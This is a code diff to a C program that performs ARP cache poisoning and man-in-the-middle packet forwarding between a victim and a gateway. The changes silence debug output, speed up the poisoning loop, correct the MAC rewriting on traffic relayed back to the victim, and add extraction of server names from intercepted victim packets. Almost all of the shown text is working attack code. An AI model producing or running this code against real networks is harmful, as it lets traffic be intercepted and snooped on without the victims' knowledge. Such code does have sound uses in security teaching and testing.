@@ -12,6 +12,7 @@
 #include <sys/types.h>
 #include <linux/if_arp.h>
 #include <linux/if_ether.h>
+#include <pthread.h>
 
 #include <netinet/ip.h>
 #include <net/ethernet.h>
@@ -383,17 +384,17 @@ void poisonArp(const struct in_addr victimIP, const unsigned char* victimMAC, co
             if (sendGratuitousArpReply(victimIP, victimMAC, gatewayIP, localMAC) < 0){
                 printf("Send ARP reply to victim failed \n");
             }
-            else{
-                printf("Send ARP reply to victim \n");              
-            }
+            // else{
+            //     printf("Send ARP reply to victim \n");              
+            // }
 
             if (sendGratuitousArpReply(gatewayIP, gatewayMAC, victimIP, localMAC) < 0){
                 printf("Send ARP reply to gateway failed \n ");
             }
-            else{
-                printf("Send ARP reply to gateway \n");
-            }
-            sleep(5);
+            // else{
+            //     printf("Send ARP reply to gateway \n");
+            // }
+            sleep(3);
         }
     }
     else{   // parent process
@@ -438,6 +439,7 @@ void get_server_name(unsigned char *buffer, int size){
         }
     }
 }
+
 
 void captureAndForward(const char* interfaceName, const struct in_addr victimIP, const unsigned char* victimMAC, const struct in_addr gatewayIP, const unsigned char* gatewayMAC) {
     int sockfd;
@@ -492,11 +494,11 @@ void captureAndForward(const char* interfaceName, const struct in_addr victimIP,
             if (memcmp(ethHeader->ether_shost, victimMAC, ETH_ALEN) == 0) {
             // Modify the destination MAC address to the gateway's MAC address
             
-                printf("Packet from victim\n");
-                for(int i = 0; i < packetSize; i++){
-                    printf("%02x ", buffer[i]);
-                }
-                printf("\n");
+                // printf("Packet from victim\n");
+                // for(int i = 0; i < packetSize; i++){
+                //     printf("%02x ", buffer[i]);
+                // }
+                // printf("\n");
 
                 memset(&gatewayAddr, 0, sizeof(struct sockaddr_ll));
                 gatewayAddr.sll_family = AF_PACKET;
@@ -523,27 +525,32 @@ void captureAndForward(const char* interfaceName, const struct in_addr victimIP,
                 //     continue;
                 // }
 
+                get_server_name(buffer, packetSize);     
+                           
                 // Forward the packet to the gateway
                 if (sendto(sockfd, buffer, packetSize, 0, (struct sockaddr*)&gatewayAddr, sizeof(struct sockaddr_ll)) < 0) {
                     perror("send to gate way");
                     continue;
                 }
 
-                printf("Packet gateway received\n");
-                for(int i = 0; i < packetSize; i++){
-                    printf("%02x ", buffer[i]);
-                }
-                printf("\n\n\n");
+                
+
+                // printf("Packet gateway received\n");
+                // for(int i = 0; i < packetSize; i++){
+                //     printf("%02x ", buffer[i]);
+                // }
+                // printf("\n\n\n");
             }
         }
 
         else{
             if (memcmp(ethHeader->ether_shost, gatewayMAC, ETH_ALEN) == 0){          
-                printf("Packet from gateway\n");
-                for (int i = 0; i < packetSize; i++){
-                    printf("%02x ", buffer[i]);
-                }
-                printf("\n");
+                // printf("Packet from gateway\n");
+                // for (int i = 0; i < packetSize; i++){
+                //     printf("%02x ", buffer[i]);
+                // }
+                // printf("\n");
+
 
                 memset(&victimAddr, 0, sizeof(struct sockaddr_ll));
                 victimAddr.sll_family = AF_PACKET;
@@ -556,31 +563,30 @@ void captureAndForward(const char* interfaceName, const struct in_addr victimIP,
                 victimAddr.sll_hatype = ARPHRD_ETHER;
 
                 // Modify the source MAC address to the attacker's MAC address
-                memcpy(ethHeader->ether_shost, gatewayMAC, ETH_ALEN);
-                memcpy(ethHeader->ether_dhost, localMAC, ETH_ALEN);
+                memcpy(ethHeader->ether_shost, localMAC, ETH_ALEN);
+                memcpy(ethHeader->ether_dhost, victimMAC, ETH_ALEN);
 
                 // if(bind(sockfd, (struct sockaddr*)&victimAddr, sizeof(struct sockaddr_ll)) < 0){
                 //     perror("bind");
                 //     continue;
                 // }
-
+                  
                 // Forward the packet back to the victim
                 if (sendto(sockfd, buffer, packetSize, 0, (struct sockaddr*)&victimAddr, sizeof(struct sockaddr_ll)) < 0) {
                     perror("sendtovictim");
                     continue;
                 }
-                printf("Packet victim received\n"); 
-                for (int i = 0; i < packetSize; i++){
-                    printf("%02x ", buffer[i]);
-                }
-                printf("\n\n\n");
+                // printf("Packet victim received\n"); 
+                // for (int i = 0; i < packetSize; i++){
+                //     printf("%02x ", buffer[i]);
+                // }
+                // printf("\n\n\n");
 
             }      
         }     
     }
     close(sockfd);
 }
-
 
 
 int main(int argc, char* argv[]){
